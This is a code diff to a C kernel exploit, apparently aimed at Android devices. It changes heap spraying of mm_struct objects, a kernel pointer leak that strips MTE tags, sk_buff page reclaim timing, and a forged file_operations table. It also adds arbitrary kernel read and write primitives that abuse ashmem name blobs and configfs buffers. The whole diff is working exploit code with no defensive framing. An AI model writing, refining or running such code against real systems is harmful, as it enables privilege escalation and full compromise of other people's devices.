@@ -275,7 +275,7 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
     task_group = text_addr(ROOT_TASK_GROUP);
     pi_waiters = 0;
     pi_top_task = text_addr(INIT_TASK);
-    waiter_prio = FAKE_WAITER_PRIO;
+    waiter_prio = FOPS_FAKE_WAITER_PRIO;
 #endif
   }
 #endif
@@ -307,7 +307,8 @@ void setup_kernelsnitch(void) {
   configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
 #else
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0,
+      KERNELSNITCH_ACTIVE_MTE_ENABLED);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   kernelsnitch_set_profile(
       ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
@@ -325,7 +326,6 @@ void run_kernelsnitch_bruteforce(void) {
   kernelsnitch_bruteforce(ks);
 }
 
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
 #if KERNELSNITCH_MTE_ENABLED
   if (leaked != (uintptr_t)-1) {
@@ -337,16 +337,11 @@ static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
 #endif
   return leaked;
 }
-#endif
 
 uintptr_t cleanup_kernelsnitch(void) {
   uintptr_t leaked = kernelsnitch_cleanup(ks);
   ks = NULL;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   return canonicalize_kernelsnitch_pointer(leaked);
-#else
-  return leaked;
-#endif
 }
 
 void read_first_line(const char *path, char *buf, size_t len) {
@@ -404,6 +399,7 @@ void log_startup_context(void) {
                "Seccomp_filters=%s", values[0], values[1], values[2]);
     }
   }
+  pr_success("rmg build id=%s\n", RMG_BUILD_ID);
   pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
              getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
              enforce);
@@ -506,7 +502,7 @@ void init_ashmem_path(void) {
 }
 
 int open_ashmem_device(void) {
-  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
+  return open(ashmem_path, O_RDWR | O_CLOEXEC);
 }
 
 uintptr_t p0_data_alias(uintptr_t image_addr) {
@@ -559,10 +555,17 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
   put64(p, off + FOPS_LLSEEK_OFF,
         fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+#if defined(CONFIGFS_CLASSIC_RW_FOPS) && CONFIGFS_CLASSIC_RW_FOPS
+  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
+  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
+  put64(p, off + FOPS_READ_ITER_OFF, 0);
+  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
+#else
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
   put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
+#endif
   put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
   put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
   put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
@@ -705,9 +708,13 @@ int clone_memfd(void) {
 }
 
 void prepare_ctxs(void) {
-  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
+  prepare_ctx.mm_cnt = MM_PREPARE_SLABS * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
+  pr_info("mm spray prepare_slabs=%d objs_per_slab=%zu prepare=%zu spray=%zu "
+          "mm_sz=0x%x order=%d\n",
+          MM_PREPARE_SLABS, mm_objs_per_slab, prepare_ctx.mm_cnt,
+          (size_t)(1 + MM_PARTIALS) * mm_objs_per_slab, MM_STRUCT_SZ, MM_ORDER);
 
   spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
   spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
@@ -892,7 +899,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
-  uint32_t waiter_prio = FAKE_WAITER_PRIO;
+  uint32_t waiter_prio = FOPS_FAKE_WAITER_PRIO;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
     write_right = 0;
@@ -1062,7 +1069,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   configure_kernelsnitch_profile(ks, payload_mode);
 #else
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0,
+      KERNELSNITCH_ACTIVE_MTE_ENABLED);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
@@ -1135,8 +1143,13 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
     return 0;
   }
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if KERNELSNITCH_ACTIVE_MTE_ENABLED
+  uintptr_t tagged_leaked = leaked;
   leaked = canonicalize_kernelsnitch_pointer(leaked);
+  pr_info("mm MTE locator raw=%016zx tag=%zu canonical=%016zx\n",
+          tagged_leaked, (tagged_leaked >> 56) & 0xf, leaked);
+#endif
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-leak");
 #endif
 
@@ -1224,11 +1237,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-#ifdef APP_SLIDE_RECLAIM_SNDBUF
-  int sndbuf = APP_SLIDE_RECLAIM_SNDBUF;
-#else
   int sndbuf = 1 << 20;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
+    defined(APP_SLIDE_RECLAIM_SNDBUF)
+  sndbuf = APP_SLIDE_RECLAIM_SNDBUF;
+#endif
+#if defined(FOPS_RECLAIM_SNDBUF)
+  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    sndbuf = FOPS_RECLAIM_SNDBUF;
+  }
 #endif
   errno = 0;
   int sndbuf_set_ret =
@@ -1246,10 +1263,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           "set_ret=%d set_errno=%d get_ret=%d get_errno=%d\n",
           sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
           sndbuf_get_ret, sndbuf_get_errno);
-#else
-  int sndbuf = 1 << 20;
-  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-#endif
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
   if (reclaim_flags >= 0) {
     fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
@@ -1267,16 +1280,42 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   msg.msg_iov = &iov;
   msg.msg_iovlen = 1;
 
+  int reclaim_sends = SKB_RECLAIM_SENDS;
+  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    reclaim_sends = FOPS_SKB_RECLAIM_SENDS;
+  }
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
+#endif
+  int interleave_reclaim_sends = 0;
+#if defined(FOPS_INTERLEAVE_RECLAIM_SENDS)
+  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    interleave_reclaim_sends = FOPS_INTERLEAVE_RECLAIM_SENDS;
+  }
+#endif
+  int reclaim_sent = 0;
+  int reclaim_errno = 0;
+
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
-#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
+  int quiet_reclaim_window = 0;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
+    defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
+  quiet_reclaim_window = 1;
+#endif
+#if defined(FOPS_QUIET_RECLAIM_WINDOW) && FOPS_QUIET_RECLAIM_WINDOW
+  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    quiet_reclaim_window = 1;
+  }
+#endif
+  if (quiet_reclaim_window) {
   /*
    * Make the target-release-to-skb-reclaim interval free of stdio flushes.
    * stdout is a regular-file stream under the payload runner, so an otherwise
    * harmless diagnostic can cross its buffer boundary at a nondeterministic
    * point and allocate while the order-3 page is briefly in the buddy.
    */
-  SYSCHK(fflush(NULL));
-#endif
+    SYSCHK(fflush(NULL));
+  }
 
   pin_to_core(CORE);
   sched_yield();
@@ -1292,9 +1331,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pre_ctx.memfds[target_pre] = -1;
   SYSCHK(close(post_ctx.memfds[0]));
   post_ctx.memfds[0] = -1;
-#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
-  pr_info("mm target-neighbor slab queued for late drain\n");
-#endif
+  if (!quiet_reclaim_window) {
+    pr_info("mm target-neighbor slab queued for late drain\n");
+  }
   for (size_t i = 0; i < target_pre; i++) {
     SYSCHK(close(pre_ctx.memfds[i]));
     pre_ctx.memfds[i] = -1;
@@ -1321,24 +1360,31 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #ifdef APP_MM_LATE_DRAIN_TRIGGERS
   drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
 #endif
+#endif
+#if defined(FOPS_MM_LATE_DRAIN_TRIGGERS)
+  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    drain_triggers = FOPS_MM_LATE_DRAIN_TRIGGERS;
+  }
+#endif
   pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
   size_t deferred_reap_count = 0;
   memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
-#endif
   for (size_t i = 0; i < drain_triggers; i++) {
     size_t index = i * mm_objs_per_slab;
     SYSCHK(close(prepare_ctx.memfds[index]));
     prepare_ctx.memfds[index] = -1;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-#if (defined(APP_DEFER_ALL_DRAIN_REAPS) && \
-     APP_DEFER_ALL_DRAIN_REAPS) || \
-    (defined(APP_DEFER_FINAL_DRAIN_REAP) && \
-     APP_DEFER_FINAL_DRAIN_REAP)
     int defer_reap = 0;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #if defined(APP_DEFER_ALL_DRAIN_REAPS) && APP_DEFER_ALL_DRAIN_REAPS
     defer_reap = 1;
 #elif defined(APP_DEFER_FINAL_DRAIN_REAP) && APP_DEFER_FINAL_DRAIN_REAP
     defer_reap = i + 1 == drain_triggers;
+#endif
+#endif
+#if defined(FOPS_DEFER_ALL_DRAIN_REAPS) && FOPS_DEFER_ALL_DRAIN_REAPS
+    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+      defer_reap = 1;
+    }
 #endif
     if (defer_reap) {
       pid_t child = prepare_ctx.childs[index];
@@ -1353,58 +1399,58 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       SYSCHK(wait_ret);
       deferred_reap_children[deferred_reap_count++] = child;
       prepare_ctx.childs[index] = -1;
-#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
-      pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
-              "code=%d status=%d\n",
-              i + 1, drain_triggers, child, child_info.si_code,
-              child_info.si_status);
-#endif
+      if (interleave_reclaim_sends > 0 && !reclaim_errno) {
+        int batch_end = reclaim_sent + interleave_reclaim_sends;
+        if (batch_end > reclaim_sends) {
+          batch_end = reclaim_sends;
+        }
+        while (reclaim_sent < batch_end) {
+          errno = 0;
+          ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
+          if (sent <= 0) {
+            reclaim_errno = errno;
+            break;
+          }
+          reclaim_sent++;
+        }
+      }
+      if (!quiet_reclaim_window) {
+        pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
+                "code=%d status=%d\n",
+                i + 1, drain_triggers, child, child_info.si_code,
+                child_info.si_status);
+      }
       continue;
     }
-#endif
-#endif
     kill_child(prepare_ctx.childs[index]);
     prepare_ctx.childs[index] = -1;
   }
-#if !defined(APP_REQUIRE_FRESH_P0_SESSION) || !APP_REQUIRE_FRESH_P0_SESSION
-  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
-#endif
-  int reclaim_sends = SKB_RECLAIM_SENDS;
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
-#endif
-  int reclaim_sent = 0;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  int reclaim_errno = 0;
-#endif
-  for (int i = 0; i < reclaim_sends; i++) {
+  if (!quiet_reclaim_window) {
+    pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
+  }
+  while (reclaim_sent < reclaim_sends && !reclaim_errno) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     if (sent <= 0) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
       reclaim_errno = errno;
-#endif
       break;
     }
     reclaim_sent++;
   }
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   for (size_t i = 0; i < deferred_reap_count; i++) {
     SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
     pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
             i + 1, deferred_reap_count, deferred_reap_children[i]);
   }
-#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
-  pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
-          deferred_reap_count);
-#endif
+  if (quiet_reclaim_window) {
+    pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
+            deferred_reap_count);
+  }
   pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
   pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
           reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-exact-drain-reclaim");
-#else
-  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
-          reclaim_sent, reclaim_sends, payload_mode);
 #endif
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
@@ -1468,11 +1514,77 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   return 0;
 }
 
+#if defined(CONFIGFS_ASHMEM_LOW24_POSITION) && \
+    CONFIGFS_ASHMEM_LOW24_POSITION
+static int configfs_ashmem_split_target(uintptr_t target, uintptr_t *base_out,
+                                        off_t *pos_out, int *rebased_out) {
+  const uintptr_t window = 0x1000000ULL;
+  uintptr_t pos = target & (window - 1);
+  uintptr_t base = target - pos;
+  int rebased = 0;
+
+#if defined(CONFIGFS_ASHMEM_REBASE_ZERO_BYTE3) && \
+    CONFIGFS_ASHMEM_REBASE_ZERO_BYTE3
+  if (((base >> 24) & 0xff) == 0) {
+    if (base < window || pos > UINT32_MAX - window) {
+      errno = EINVAL;
+      return 0;
+    }
+    base -= window;
+    pos += window;
+    rebased = 1;
+  }
+#endif
+
+  if (base + pos != target || pos > INT64_MAX) {
+    errno = EINVAL;
+    return 0;
+  }
+  *base_out = base;
+  *pos_out = (off_t)pos;
+  if (rebased_out) {
+    *rebased_out = rebased;
+  }
+  return 1;
+}
+#endif
+
 ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
   unsigned char blob[128];
   memset(blob, 0, sizeof(blob));
-  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
-  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
+  uintptr_t buffer = target;
+  off_t pos = 0;
+  size_t buffer_size = len;
+#if defined(CONFIGFS_ASHMEM_LOW24_POSITION) && \
+    CONFIGFS_ASHMEM_LOW24_POSITION
+  int rebased = 0;
+  if (!configfs_ashmem_split_target(target, &buffer, &pos, &rebased)) {
+    return -1;
+  }
+  size_t required_size = (size_t)pos + len;
+  if (required_size < (size_t)pos) {
+    errno = EINVAL;
+    return -1;
+  }
+#if defined(CONFIGFS_ASHMEM_PAD_BUFFER_SIZE) && \
+    CONFIGFS_ASHMEM_PAD_BUFFER_SIZE
+  buffer_size = required_size | 0x010101ULL;
+#else
+  buffer_size = required_size;
+#endif
+  if (buffer_size < required_size || buffer_size > INT32_MAX) {
+    errno = EINVAL;
+    return -1;
+  }
+  if (rebased) {
+    pr_info("configfs address rebase op=write target=%016zx base=%016zx "
+            "pos=%08llx len=%zu\n",
+            target, buffer, (unsigned long long)pos, len);
+  }
+#endif
+  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, buffer);
+  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
+        buffer_size);
   put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
   errno = 0;
   int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
@@ -1483,15 +1595,30 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   }
 
   errno = 0;
-  ssize_t wr = pwrite(fd, data, len, 0);
+  ssize_t wr = pwrite(fd, data, len, pos);
   return wr;
 }
 
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   unsigned char blob[128];
   memset(blob, 0, sizeof(blob));
+#if defined(CONFIGFS_ASHMEM_LOW24_POSITION) && \
+    CONFIGFS_ASHMEM_LOW24_POSITION
+  off_t pos = 0;
+  uintptr_t page = 0;
+  int rebased = 0;
+  if (!configfs_ashmem_split_target(target, &page, &pos, &rebased)) {
+    return -1;
+  }
+  if (rebased) {
+    pr_info("configfs address rebase op=read target=%016zx base=%016zx "
+            "pos=%08llx len=%zu\n",
+            target, page, (unsigned long long)pos, len);
+  }
+#else
   off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
   uintptr_t page = target - (uintptr_t)pos;
+#endif
   put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
   put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
   errno = 0;
